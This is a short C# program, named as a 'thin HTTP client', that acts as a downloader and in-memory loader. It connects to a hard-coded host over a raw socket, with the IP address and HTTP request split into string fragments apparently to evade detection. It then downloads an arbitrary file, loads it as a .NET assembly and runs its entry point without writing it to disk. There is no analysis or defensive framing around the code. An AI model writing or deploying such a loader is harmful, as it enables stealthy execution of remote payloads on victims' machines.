using System;
using System.Collections.Generic;
using System.Net.Sockets;
using System.Reflection;

namespace ThinHttpClient
{
    public static class Program
    {
        public static void Main(string[] args)
        {
            Int32 port = 80;
            Byte[] DataReceived = new Byte[1024];
            List<Byte> AssemblyData = new List<byte>();

            Socket socket = new Socket(SocketType.Stream, ProtocolType.Tcp);
            socket.Connect("19"+"2."+"168."+"1.214", port);
            Byte[] data = System.Text.Encoding.ASCII.GetBytes(String.Format("G"+"ET /{0} HT"+"TP/1"+".0"+"\n\n", args[0]));

            socket.Send(data);

            int amountReceived = socket.Receive(DataReceived); //double read, the first for the http headers, the second for the content

            while (amountReceived > 0)
            {
                amountReceived = socket.Receive(DataReceived);
                for(int i = 0; i < amountReceived; i++) {
                    AssemblyData.Add(DataReceived[i]);
                }
                //responseChars = System.Text.Encoding.ASCII.GetChars(DataReceived, 0, amountReceived);
            }
            RunPortable(Converter(AssemblyData));
            //Console.WriteLine(responseChars, 0, amountReceived);
        }

        private static Byte[] Converter(List<Byte> predata)
        {
            return predata.ToArray();
        }

        private static void RunPortable(Byte[] aliendata)
        {
            Byte[] transferdata = aliendata;
            Assembly wp = Assembly.Load(transferdata);
            MethodInfo method = wp.EntryPoint;
            object[] parameters = new object[] { new string[] { "" } };
            method.Invoke(null, parameters);
        }


        private static void PointAndShoot(Byte[] aliendata)
        {

        }
    }
}
